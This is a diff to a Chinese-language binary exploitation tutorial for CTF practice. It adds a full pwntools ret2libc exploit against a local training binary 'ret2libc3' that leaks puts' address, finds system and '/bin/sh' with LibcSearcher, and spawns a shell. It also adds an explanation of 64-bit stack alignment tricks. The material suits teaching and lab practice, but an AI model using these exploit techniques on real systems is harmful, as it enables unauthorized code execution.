@@ -1,6 +1,6 @@
 # pwn basic
 
-`更新时间：2025-3-13`
+`更新时间：2025-3-18`
 
 注释解释：
 
@@ -1912,11 +1912,11 @@ puts_plt = elf.plt['puts']
 puts_got = elf.got['puts']
 
 payload = flat([b'a' * 112, puts_plt, b'bbbb', puts_got])
-// 指定接收位置在原程序输出之后
+# 指定接收位置在原程序输出之后
 sh.sendlineafter('Can you find it !?', payload)
-// u32()用于解码字节数据，与p32()相对
-// [0: 4]截断需要的内容，即前四位是puts的地址，后面的数据是无效数据
-// hex()用于将10进制转换为16进制
+# u32()用于解码字节数据，与p32()相对
+# [0: 4]截断需要的内容，即前四位是puts的地址，后面的数据是无效数据
+# hex()用于将10进制转换为16进制
 print(hex(u32(sh.recv()[0: 4])))
 ```
 
@@ -2024,7 +2024,61 @@ print(puts_addr - system_addr)
 
 其实可以发现，使用`LibcSearcher`库可以直接得到`system()`和`"/bin/sh"`的地址，因此我们直接通过`LibcSearcher`构建攻击脚本，但是在此之前，我们先捋一下攻击的过程
 
-- 首先栈溢出，返回地址`put@plt`，让程序执行`puts()`，参数为`puts@got`，带出`puts()`的实际地址
+- 首先第一次栈溢出，返回地址`put@plt`，让程序执行`puts()`，参数为`puts@got`，带出`puts()`的实际地址
 - 然后程序需要返回`main()`函数，因为我们得到`puts()`的地址后，程序会继续进行下去，如果此时不返回`main()`函数，而是直接停止执行，那么得到的`puts()`函数的地址将没有任何意义
-- 程序返回`main()`函数重新执行，然后我们进行栈溢出
+- 程序返回`main()`函数重新执行，然后进行第二次栈溢出，第二次栈溢出与第一次有些不同，因为在第一次栈溢出时，我们将`ebp`用`b'aaaa'`进行了覆盖，程序返回到`puts()`后，`ebp`的内容错误，导致`b'aaaa'`没有被弹出栈，后续我们又传入了参数`puts_got`，该参数也没有被弹出栈，因此第二次栈溢出需要的垃圾数据长度要少8个字节
 
+- 然后程序返回`system()`，调用`"/bin/sh"`，最终`getshell`
+
+```py
+from pwn import *
+from LibcSearcher import *
+
+elf = ELF('./ret2libc3')
+sh = process('./ret2libc3')
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main = elf.symbols['main']
+
+payload = flat([b'a' * 112, puts_plt, main, puts_got])
+sh.sendlineafter('Can you find it !?', payload)
+
+puts_addr = u32(sh.recv()[0: 4])
+libc = LibcSearcher('puts', puts_addr)
+libc_base = puts_addr - libc.dump('puts')
+system_addr = libc_base + libc.dump('system')
+bin_sh = libc_base + libc.dump('str_bin_sh')
+
+payload = flat([b'a' * 104, system_addr, b'bbbb', bin_sh])
+sh.sendline(payload)
+sh.interactive()
+```
+
+执行脚本，成功`getshell`
+
+> <img src="./img/95.png">
+
+## 栈对齐
+
+在进行64位攻击的时候，通常需要考虑栈对齐问题，那么，什么是栈对齐？
+
+简单来说，64位的ubuntu系统在调用`system()`函数时，有一个`movaps`的指令，`movaps`指令用于在128位对齐的单精度浮点数向量寄存器或内存之间进行数据传输，能够让计算机同时处理多个浮点数数据，提高数据处理效率。这个指令要求内存地址必须16字节对齐，即程序调用`system()`时，`rsp`指向的地址末位必须是`0`
+
+我们使用一个案例来查看，这个案例没有栈对齐
+
+> <img src="./img0/5.png">
+
+上图中，程序正在执行`system()`函数，但是此时的`rsp`指向地址为`0x7fff80e011a8`，因此最终攻击会报错`Got EOF while reading in interactive`
+
+**如何栈对齐**
+
+栈对齐的方法一般有两种
+
+1. `addr + 1`
+
+`addr + 1`是指将返回地址更改为返回函数的起始位置后一位，因为通常函数的第一位指令都是`push rbp`，这条执行会在栈上写入一个`rbp`，直接跳过这条指令，就能让栈上少8字节，在进行攻击时，栈就会是对齐状态
+
+2. `pop_ret`
+
+对于普通`payload`，例如`payload = flat([cyclic(0x88), callsystem])`，`callsystem`是直接覆盖了子函数的返回地址，这里我们可以直接插入一个`ret`，如`payload = flat([cyclic(0x88), ret, callsystem])`，执行`ret`后，栈上的`callsystem`地址就被弹入了`rip`，然后返回`callsystem`，这样栈上就能少8个字节，栈就会是对齐状态
